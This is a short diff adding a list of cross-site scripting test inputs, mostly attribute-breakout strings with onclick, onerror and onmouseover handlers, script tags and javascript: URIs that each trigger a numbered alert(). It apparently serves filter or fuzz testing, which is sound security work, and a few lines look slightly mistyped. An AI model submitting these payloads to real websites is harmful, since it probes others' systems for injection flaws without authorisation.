@@ -1,0 +1,16 @@
+" onclick="alert(1)"
+<script>alert(1)</script>
+x"onclick="alert(2)
+x' onclick='alert(3)
+x"onclick="alert(4)
+x"><a href="javascript:alert(5)">yy</a>
+x"ONclick="alert(6)
+x"oonnclick="alert7)
+javascript:alert(8)
+x"onclick="alert(10)" type="button
+x"onclick="alert(11)" type="button
+x"onclick="alert(12)" type="button
+user=x"onclick="alert(13)" type="button
+test<img%oasrc=1%oaonerror=alert(16)>
+1111 onmouseover=alert(17)
+1111 onmouseover=alert(18)
